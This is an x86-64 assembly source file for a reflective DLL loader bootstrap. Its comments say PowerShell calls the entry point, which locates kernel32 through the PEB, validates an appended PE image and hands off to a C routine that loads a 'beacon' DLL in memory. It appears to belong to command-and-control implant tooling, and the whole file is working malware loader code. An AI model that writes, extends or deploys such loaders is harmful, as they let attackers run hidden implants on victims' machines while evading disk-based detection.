.intel_syntax noprefix
.section .text

# ═══════════════════════════════════════════════════════════════════════════════
#  reflective_loader_bootstrap.asm
#  PIC entry: PEB -> kernel32 -> calls C core reflective_load_core(k32,ldr,dll,bm_rva)
#
#  LAYOUT IN MEMORY:
#    [0x0000] _reflective_loader_entry  (offset 0 -- PowerShell calls here)
#    [0x....] _reflective_loader_config (4 magic + 8 dll_offset + 8 bm_rva)
#    [0x....] loader code continues
#    [size]   beacon PE data (appended by builder)
# ═══════════════════════════════════════════════════════════════════════════════

.globl _reflective_loader_entry
.globl _reflective_loader_config

.align 8
_reflective_loader_entry:
    push    rbp
    mov     rbp, rsp
    push    rbx
    push    r14
    push    r15

    # --- PIC base (start of binary, entry is at offset 0) ---
    lea     r15, [rip + _reflective_loader_entry]

    # --- Read config: magic(4) + dll_offset(8) + bm_rva(8) ---
    lea     rax, [rip + _reflective_loader_config]
    mov     r14, [rax + 4]            # DLL offset from binary start -> PE
    add     r14, r15                  # R14 = PE file data
    mov     r13, [rax + 12]           # beacon_main RVA within PE

    # --- Validate MZ ---
    cmp     word ptr [r14], 0x5A4D
    jne     .Lfail

    # --- PEB -> kernel32 ---
    mov     rax, qword ptr gs:[0x60]  # PEB
    mov     rax, [rax + 0x18]         # Ldr
    mov     rsi, [rax + 0x10]         # InLoadOrderModuleList.Flink (EXE)
    mov     rsi, [rsi]                # -> ntdll
    mov     rsi, [rsi]                # -> kernel32
    # rsi now points to kernel32's InLoadOrderLinks (offset 0x00 in LDR_DATA_TABLE_ENTRY)
    # DllBase is at offset 0x30 (not 0x20!)
    mov     rbx, [rsi + 0x30]         # DllBase

    # --- Call C core: reflective_load_core(kernel32, loader_base, dll_data, bm_rva) ---
    # Windows x64 ABI: RCX=1st, RDX=2nd, R8=3rd, R9=4th
    mov     rcx, rbx                  # kernel32 base
    mov     rdx, r15                  # loader base
    mov     r8,  r14                  # DLL file data
    mov     r9,  r13                  # beacon_main RVA
    # Stack at this point: 4 pushes = RSP 8 mod 16 (needs to be 0 mod 16 for call)
    # Allocate 0x28 = 32 bytes shadow space + 8 bytes alignment padding
    sub     rsp, 0x28
    call    reflective_load_core
    add     rsp, 0x28

    xor     eax, eax
    jmp     .Ldone

.Lfail:
    mov     eax, 1

.Ldone:
    pop     r15
    pop     r14
    pop     rbx
    pop     rbp
    ret

.align 8
_reflective_loader_config:
    .byte 0xAA, 0xBB, 0xCC, 0xDD
    .quad 0          # DLL offset (patched by builder: bytes from loader start to PE)
    .quad 0          # beacon_main RVA (patched by builder: RVA within PE)
